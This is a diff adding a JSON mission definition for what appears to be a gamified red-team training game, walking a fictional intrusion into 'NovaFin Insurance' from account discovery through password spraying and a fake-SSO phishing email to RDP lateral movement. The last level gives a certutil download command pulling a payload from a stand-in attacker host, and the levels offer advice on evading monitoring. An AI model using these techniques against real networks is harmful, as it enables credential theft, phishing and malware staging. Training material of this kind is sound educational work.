@@ -1,0 +1,271 @@
+{
+  "mission_id": "operation_iron_signal",
+  "name": "Operation Iron Signal",
+  "description": "Проникнення в мережу NovaFin Insurance: від розвідки облікових записів AD до lateral movement та staging payload.",
+  "difficulty": "intermediate",
+  "order_index": 2,
+  "mitre_techniques": ["T1087.002", "T1110.003", "T1566.002", "T1021.001", "T1059.003"],
+  "levels": [
+    {
+      "level_id": "iron_discovery_01",
+      "mission_id": "operation_iron_signal",
+      "mitre_id": "T1087.002",
+      "title": "Active Directory Account Discovery",
+      "order": 1,
+      "dialogue": [
+        {
+          "speaker": "system",
+          "text": "[System]: Mission 'Operation Iron Signal' started."
+        },
+        {
+          "speaker": "system",
+          "text": "Target: NovaFin Insurance internal network."
+        },
+        {
+          "speaker": "handler",
+          "text": "We dumped a slice of LDAP from their DC. Find the service account we can spray — not a regular user mailbox."
+        }
+      ],
+      "task_type": "code_editor",
+      "work_area": {
+        "code_snippet": "# LDAP export fragment (internal)\ndn: CN=jsmith,OU=Users,DC=novafin,DC=local\nsAMAccountName: jsmith\nmail: jsmith@novafin.local\n\ndn: CN=svc_backup_nova,OU=ServiceAccounts,DC=novafin,DC=local\nsAMAccountName: svc_backup_nova\nservicePrincipalName: HOST/backup.novafin.local\n\ndn: CN=helpdesk,OU=Users,DC=novafin,DC=local\nsAMAccountName: helpdesk01",
+        "input_type": "regex",
+        "placeholder": "Enter regex pattern"
+      },
+      "validation": {
+        "type": "regex_match",
+        "correct_pattern": "svc_backup_[a-z0-9_]+",
+        "test_string": "svc_backup_nova"
+      },
+      "rewards": {
+        "xp": 150,
+        "stealth_impact": 0
+      },
+      "hints": [
+        "Шукайте обліковий запис у OU=ServiceAccounts",
+        "Service account часто має префікс svc_",
+        "Regex має знайти sAMAccountName сервісного акаунта"
+      ]
+    },
+    {
+      "level_id": "iron_spray_02",
+      "mission_id": "operation_iron_signal",
+      "mitre_id": "T1110.003",
+      "title": "Password Spraying Strategy",
+      "order": 2,
+      "dialogue": [
+        {
+          "speaker": "system",
+          "text": "[System]: Phase 1 - Discovery complete. Service account identified."
+        },
+        {
+          "speaker": "handler",
+          "text": "NovaFin locks accounts after five failures. Pick a spray plan that avoids lockout and stays quiet."
+        }
+      ],
+      "task_type": "tactical_choice",
+      "work_area": {
+        "choices": [
+          {
+            "id": "choice_1",
+            "text": "One common password across many accounts, 30-minute delay between attempts",
+            "correct": true,
+            "feedback": "Саме так: password spraying з паузами — менше шанс lockout і менше шуму в SIEM."
+          },
+          {
+            "id": "choice_2",
+            "text": "Rapid brute force on svc_backup_nova until success",
+            "correct": false,
+            "feedback": "Швидкі спроби на один акаунт — lockout і алерт SOC за хвилини."
+          },
+          {
+            "id": "choice_3",
+            "text": "Spray hundreds of passwords on svc_backup_nova in one minute",
+            "correct": false,
+            "feedback": "Це brute force, не spray. Акаунт заблокують одразу."
+          }
+        ]
+      },
+      "validation": {
+        "type": "choice",
+        "correct_choice_id": "choice_1"
+      },
+      "rewards": {
+        "xp": 200,
+        "stealth_impact": 0
+      },
+      "hints": [
+        "Password spraying — один пароль на багато акаунтів, не навпаки",
+        "Політика NovaFin: 5 невдалих спроб = lockout",
+        "Паузи між спробами знижують шум у логах"
+      ]
+    },
+    {
+      "level_id": "iron_spearphish_03",
+      "mission_id": "operation_iron_signal",
+      "mitre_id": "T1566.002",
+      "title": "Spearphishing Link",
+      "order": 3,
+      "dialogue": [
+        {
+          "speaker": "system",
+          "text": "[System]: Phase 2 - Credential Access. Valid creds for finance analyst obtained."
+        },
+        {
+          "speaker": "handler",
+          "text": "Compose a spearphish to analyst@novafin.local. Drive them to our fake SSO page — no executables in attachments."
+        }
+      ],
+      "task_type": "phishing_constructor",
+      "work_area": {
+        "email_fields": {
+          "to": "analyst@novafin.local",
+          "subject": "",
+          "body": ""
+        },
+        "attachments": [
+          {
+            "id": "att_1",
+            "name": "Policy_Update.pdf",
+            "type": "application/pdf",
+            "allowed": true
+          },
+          {
+            "id": "att_2",
+            "name": "SSO_Installer.exe",
+            "type": "application/x-msdownload",
+            "allowed": true
+          }
+        ]
+      },
+      "validation": {
+        "type": "email_check",
+        "required_keyword_groups": [
+          ["novafin-sso", "sso.novafin", "novafin sso"],
+          [
+            "verify",
+            "verification",
+            "confirm",
+            "session",
+            "підтверд",
+            "підтвердження",
+            "верифікац",
+            "сесія",
+            "сесію"
+          ],
+          [
+            "https://",
+            "http://",
+            "login",
+            "sign in",
+            "увійти",
+            "увійд",
+            "вхід",
+            "логін",
+            "авторизац"
+          ]
+        ],
+        "blocked_extensions": [".exe", ".scr", ".bat"]
+      },
+      "rewards": {
+        "xp": 250,
+        "stealth_impact": -5
+      },
+      "hints": [
+        "Тема/текст: посилання на fake SSO — novafin-sso.com або sso.novafin",
+        "Додай слова про підтвердження/сесію: confirm, verify, підтвердження, сесія",
+        "Посилання на вхід: https://…, login, увійти, авторизація",
+        "Не додавай .exe у вкладення — фільтри NovaFin заблокують"
+      ]
+    },
+    {
+      "level_id": "iron_lateral_04",
+      "mission_id": "operation_iron_signal",
+      "mitre_id": "T1021.001",
+      "title": "Remote Desktop Lateral Movement",
+      "order": 4,
+      "dialogue": [
+        {
+          "speaker": "system",
+          "text": "[System]: Phase 3 - Initial Access. Analyst session captured."
+        },
+        {
+          "speaker": "handler",
+          "text": "Move to the finance server. Their bastion is monitored — choose the path that blends in."
+        }
+      ],
+      "task_type": "tactical_choice",
+      "work_area": {
+        "choices": [
+          {
+            "id": "choice_1",
+            "text": "RDP to jump host 10.0.5.20, then RDP to FIN-SRV01 (10.0.8.45)",
+            "correct": true,
+            "feedback": "Jump host — типовий шлях у корпоративних мережах. Менше аномалій, ніж прямий доступ до DC."
+          },
+          {
+            "id": "choice_2",
+            "text": "Direct RDP from workstation to domain controller 10.0.0.1",
+            "correct": false,
+            "feedback": "Прямий RDP на DC з user workstation — рідкісна поведінка, SOC побачить одразу."
+          },
+          {
+            "id": "choice_3",
+            "text": "SMB to \\\\FIN-SRV01\\ADMIN$ from public Wi-Fi without VPN",
+            "correct": false,
+            "feedback": "ADMIN$ ззовні периметра без VPN — не пройде firewall і викличе алерт."
+          }
+        ]
+      },
+      "validation": {
+        "type": "choice",
+        "correct_choice_id": "choice_1"
+      },
+      "rewards": {
+        "xp": 300,
+        "stealth_impact": -5
+      },
+      "hints": [
+        "У фінансових мережах часто є bastion / jump host",
+        "Прямий доступ до DC з робочої станції — red flag",
+        "Lateral movement має виглядати як звична адмін-діяльність"
+      ]
+    },
+    {
+      "level_id": "iron_staging_05",
+      "mission_id": "operation_iron_signal",
+      "mitre_id": "T1059.003",
+      "title": "Windows Command Shell Staging",
+      "order": 5,
+      "dialogue": [
+        {
+          "speaker": "system",
+          "text": "[System]: Phase 4 - Lateral Movement. FIN-SRV01 access confirmed."
+        },
+        {
+          "speaker": "handler",
+          "text": "Stage the payload on disk using certutil — PowerShell is heavily logged here. One quiet command."
+        }
+      ],
+      "task_type": "code_editor",
+      "work_area": {
+        "code_snippet": "# Use certutil to download staging binary\n# URL: https://cdn.novafin-sso.com/stage.bin\n# Save to: %TEMP%\\stage.bin",
+        "input_type": "command",
+        "placeholder": "Enter cmd command"
+      },
+      "validation": {
+        "type": "ast_parse",
+        "correct_pattern": "certutil"
+      },
+      "rewards": {
+        "xp": 350,
+        "stealth_impact": -10
+      },
+      "hints": [
+        "certutil -urlcache -split -f <url> <local path>",
+        "Використовуй URL з briefing",
+        "PowerShell тут під моніторингом — cmd + certutil тихіше"
+      ]
+    }
+  ]
+}
